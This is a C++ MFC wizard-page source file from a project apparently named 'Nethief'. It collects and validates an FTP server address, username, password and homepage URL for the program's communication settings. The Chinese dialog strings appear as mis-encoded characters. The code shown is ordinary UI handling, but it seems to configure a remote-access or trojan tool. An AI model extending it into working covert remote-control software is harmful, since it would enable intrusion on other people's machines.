//Download by http://www.NewXing.com
// WizardPage2.cpp : implementation file
//

#include "stdafx.h"
#include "Nethief.h"
#include "WizardPage2.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CWizardPage2 property page

IMPLEMENT_DYNCREATE(CWizardPage2, CPropertyPage)

CWizardPage2::CWizardPage2() : CPropertyPage(CWizardPage2::IDD)
{
	//{{AFX_DATA_INIT(CWizardPage2)
	m_strAddress = _T("");
	m_strPassword = _T("");
	m_strUsername = _T("");
	m_strHomepage = _T("http://");
	//}}AFX_DATA_INIT
}

CWizardPage2::~CWizardPage2()
{
}

void CWizardPage2::DoDataExchange(CDataExchange* pDX)
{
	CPropertyPage::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWizardPage2)
	DDX_Text(pDX, IDC_EDIT_ADDRESS, m_strAddress);
	DDX_Text(pDX, IDC_EDIT_PASSWORD, m_strPassword);
	DDX_Text(pDX, IDC_EDIT_USERNAME, m_strUsername);
	DDX_Text(pDX, IDC_EDIT_HOMEPAGE, m_strHomepage);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWizardPage2, CPropertyPage)
	//{{AFX_MSG_MAP(CWizardPage2)
		// NOTE: the ClassWizard will add message map macros here
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CWizardPage2 message handlers

BOOL CWizardPage2::OnSetActive() 
{
	// TODO: Add your specialized code here and/or call the base class
	CPropertySheet* pParent=(CPropertySheet*)GetParent();
	pParent->SetWizardButtons(PSWIZB_BACK|PSWIZB_NEXT);
	
	return CPropertyPage::OnSetActive();
}

BOOL CWizardPage2::OnQueryCancel() 
{
	// TODO: Add your specialized code here and/or call the base class
	if(MessageBox("������͵������δ������ù��̡�\r\n\r\n�Ƿ����˳����򵼣�",
		"������͵ ������",MB_ICONQUESTION|MB_YESNO)==IDNO)
		return FALSE;
	
	return CPropertyPage::OnQueryCancel();
}

LRESULT CWizardPage2::OnWizardNext() 
{
	// TODO: Add your specialized code here and/or call the base class
	UpdateData(TRUE);

	CString strText="";
	if(m_strAddress=="")
		strText="����д��FTP��������������IP��ַ����";
	if(m_strUsername=="")
		strText="����д����ҳ�ռ���û�������";
	if(m_strPassword=="")
		strText="����д����ҳ�ռ�����롱��";
	if(m_strHomepage=="")
		strText="����д�������ҳ�ռ����ַ����";
	if(strText!="")
	{
		MessageBox(strText,"������͵ ������",MB_ICONWARNING|MB_OK);
		return -1;
	}
	m_strAddress.TrimLeft();
	m_strAddress.TrimRight();
	m_strUsername.TrimLeft();
	m_strUsername.TrimRight();
	m_strPassword.TrimLeft();
	m_strPassword.TrimRight();
	m_strHomepage.TrimLeft();
	m_strHomepage.TrimRight();


	CCommunity* pCommunity=((CNethiefApp*)AfxGetApp())->pCommunity;
	pCommunity->SetFtpServerInfo(0,
		m_strAddress,m_strUsername,m_strPassword,m_strHomepage,
		"","","","",
		"",
		"");
	
	return CPropertyPage::OnWizardNext();
}
